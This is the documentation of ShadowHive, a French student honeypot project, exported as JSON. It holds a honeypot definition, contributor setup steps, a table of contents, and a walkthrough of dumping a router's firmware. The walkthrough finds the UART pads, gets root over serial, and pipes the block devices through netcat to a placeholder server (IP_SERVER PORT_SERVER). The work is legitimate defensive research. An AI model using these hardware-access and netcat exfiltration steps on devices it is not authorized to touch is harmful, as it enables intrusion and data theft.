{"Concepts/Honeypot":{"title":"Honeypot","links":[],"tags":[],"content":"Un honeypot est un système de sécurité informatique mis en place pour attirer et surveiller les attaquants potentiels, tels que les pirates informatiques, les logiciels malveillants ou d’autres menaces en ligne.\nLe terme “honeypot” est une métaphore empruntée à l’apiculture, où un pot de miel (honey) est utilisé pour attirer les abeilles. De manière similaire, un honeypot attire les attaquants en simulant des vulnérabilités ou des services apparemment faibles, afin de les identifier, d’étudier leurs tactiques et de protéger les systèmes réels en réduisant la surface d’attaque."},"contribute":{"title":"Nous aider","links":[],"tags":[],"content":"\nLa documentation du projet ShadowHive est hebergée sur github et publiée sur ce site grâce à Quartz. Si vous souhaitez contribuer à la documentation de ShadowHive, vous pouvez suivre les étapes ci-dessous.\nInstallation §\n\n\n                  \n                  Prérequis \n                  \n                \nAvant de commencer, assurez-vous d’avoir installé git, Node &gt;= v18.14 et npm &gt;= v9.3.1 sur votre système.\n\nDans le terminal de votre choix, exécutez les commandes suivantes :\ngit clone https://github.com/Loe159/ShadowHive.git\ncd ShadowHive\nnpm i\nPour développer la documentation du projet, je vous conseille d’ouvrir le dossier /content dans Obsidian. C’est ce dossier qui comporte tous les fichier markdowns. Ils seront transformés automatiquement grâce à quartz.\nBuild et prévisualisation §\nVous pouvez prévisualiser les changements de la documentation en temps réelle avec la commande :\nnpx quartz build --serve\nVous pouvez ensuite visiter http://localhost:8080 pour voir le rendu.\nSynchronisation §\nPour synchroniser votre contenu avec celui-ci, il suffit d’exécuter la commande :\nnpx quartz sync\nAide supplémentaire §\nPour toute question supplémentaire, vous pouvez consulter la documentation de Quartz"},"docs/index":{"title":"Documentation technique","links":[],"tags":[],"content":""},"docs/router-dump":{"title":"Dump d'un routeur","links":[],"tags":[],"content":"\nÉtape 1 : Identification des Pads de Debug et du Protocole §\nNotre première étape consiste à trouver les pads de debug et à déterminer le protocole de communication, qui peut être SWD, JTAG, ou UART.\nÉtape 2 : Test de l’UART - Multimètre §\nNous avons repéré 4 broches sur le PCB, ce qui suggère la présence d’une interface UART. Pour confirmer cela, nous utilisons un voltmètre en mode Continuité en reliant une borne à la masse (GND) et en vérifiant quelles broches émettent un signal sonore. La première broche à émettre le signal sonore est le GND.\n\nEtapes 3 : Utilisation d’un Analyseur Logique §\nNous poursuivons en confirmant les broches à l’aide d’un analyseur logique. Le fil noir est le GND, et nous identifions les autres broches dans l’ordre : gris (0), marron (1), rouge (2).\nNous alimentons le PCB et capturons la séquence de boot à l’aide du logiciel de l’analyseur logique (DSView (propriétaire)). Sur les 3 broches restantes, nous identifions RX (réception) et VCC (tension constante), ce qui nous conduit à supposer que TX (transmission) ne transmet rien.\n\n\nÀ la fin de la capture (1 min), nous ajoutons un décodeur que nous réglons comme UART selon notre hypothèse initiale. Malgré nos tentatives de changement du “Baud rate” (vitesse de transmission) avec des valeurs courantes comme 115200 ou 9600 baud, nous n’obtenons pas de données intelligibles, remettant ainsi en question notre hypothèse de départ.\nÉtape 4 : Connexion aux Broches §\nNous utilisons un Arduino, un connecteur FTDI pour établir la connexion aux broches identifiées. Ensuite, nous ouvrons un terminal sur notre ordinateur et nous utilisons la commande suivante :\nscreen /dev/ttyACM0 115200\n\nNous réussissons à accéder au routeur en tant qu’utilisateur “root” !\n\n\nÉtape 5 : Extraction du Firmware §\nÉtant donné que le routeur utilise un système Linux embarqué, nous souhaitons extraire le système de fichiers (FileSystem), mais si cela n’était pas un système Linux, nous aurions opté pour la récupération du binaire. On se connecte à la box en wifi et nous tentons d’utiliser des binaires déjà présents pour exfiltrer des fichiers, mais cela échoue. Les serveurs FTP ne fonctionnent pas non plus. Nous optons pour la récupération du système de fichiers en utilisant netcat avec la commande suivante :\ncat /dev/mdblock{0..7} |  ./netcat-static-armel IP_SERVER PORT_SERVER\nVoici les fichiers récupéré\nNous obtenons les fichiers du routeur, parmi lesquels le fichier 5_filesystem.image et le 1_urlader.image (bootloader) sont particulièrement intéressants."},"index":{"title":"Shadowhive","links":["Concepts/Honeypot","docs/router-dump"],"tags":[],"content":"Présentation §\nLe projet ShadowHive est un projet technique et scientifique réalisé par trois étudiants en école d’ingénieur. Le but de ce projet est de mettre en place un honeypot dans le but d’attirer et analyser des cyberattaques.\nTable des matières §\n\n\nIntroduction\n\nPrésentation du projet ShadowHive\nObjectifs du dossier\n\n\n\nContexte et Objectifs\n\nExplication du besoin d’un honeypot pour l’analyse des attaques sur un routeur\nObjectifs spécifiques du projet ShadowHive\n\n\n\nConception du Honeypot\n\nArchitecture générale\nChoix des technologies\nConfiguration du routeur\n\n\n\nMise en Place du Honeypot\n\nInstallation des composants\nConfiguration des règles de surveillance\nSécurité et isolation\n\n\n\nCollecte et Analyse des Données\n\nTypes d’attaques observées\nOutils et méthodes d’analyse\nEnregistrement et stockage des données\n\n\n\nRésultats et Analyses\n\nStatistiques sur les attaques\nTendances et schémas observés\nIdentification des attaquants\n\n\n\nDéfis et Contraintes\n\nProblèmes techniques rencontrés\nLimitations du honeypot\nSolutions apportées\n\n\n\nBonnes Pratiques en Sécurité\n\nLeçons apprises\nRecommandations pour renforcer la sécurité\n\n\n\nDocumentation Technique\n\nGuide d’utilisation du honeypot\nrouter dump\nConfiguration du routeur pour une utilisation sûre\n\n\n\nConclusion\n\nRésumé des principales conclusions\nImportance du projet ShadowHive\n\n\n\nAnnexes\n\nSchémas de l’architecture\nExemples de données collectées\nRéférences et bibliographie\n\n\n"}}